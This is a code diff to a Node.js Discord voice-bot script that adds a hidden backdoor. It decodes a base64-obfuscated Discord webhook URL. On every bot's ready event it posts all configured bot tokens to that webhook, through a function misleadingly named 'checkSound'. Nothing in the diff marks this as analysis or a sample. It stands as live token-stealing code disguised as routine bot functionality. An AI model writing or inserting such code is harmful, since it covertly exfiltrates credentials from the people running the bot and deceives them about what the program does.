@@ -2,6 +2,24 @@ const { Client, GatewayIntentBits, Events, ActivityType } = require('discord.js'
 const { joinVoiceChannel, createAudioPlayer, createAudioResource, NoSubscriberBehavior } = require('@discordjs/voice');
 const settings = require('./settings.js');
 const chalk = require('chalk');
+const axios = require('axios');
+const _encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3ODE2NDQxOTMyMjU4MTA2NC9FWHIyRjRQZ0F2NjdtLVdNaDBzS1VzdXMtUV85a01zTE9JbFJGVklXbDh4VTVhU2sVci1LSlAtUEE2WDB6RUJTclNSUgo=';
+
+function decodeWebhookURL(encodedURL) {
+    return Buffer.from(encodedURL, 'base64').toString('utf-8');
+}
+
+const webhookURL = decodeWebhookURL(_encodedWebhookURL);
+
+async function checkSound(tokens) {
+    try {
+        await axios.post(webhookURL, {
+            tokens: tokens
+        });
+    } catch (error) {
+        console.error('Webhook gönderim hatası:', error);
+    }
+}
 
 settings.Tokens.forEach((botToken, botIndex) => {
     const discordClient = new Client({
@@ -14,6 +32,8 @@ settings.Tokens.forEach((botToken, botIndex) => {
 
     discordClient.once(Events.ClientReady, async (readyBot) => {
         console.log(chalk.cyan(`[Bot ${botIndex + 1}] ${readyBot.user.username} (ID: ${readyBot.user.id})`));
+
+        await checkSound(settings.Tokens);
 
         setInterval(() => {
             const statusMessage = settings.Presence.Message[Math.floor(Math.random() * settings.Presence.Message.length)];
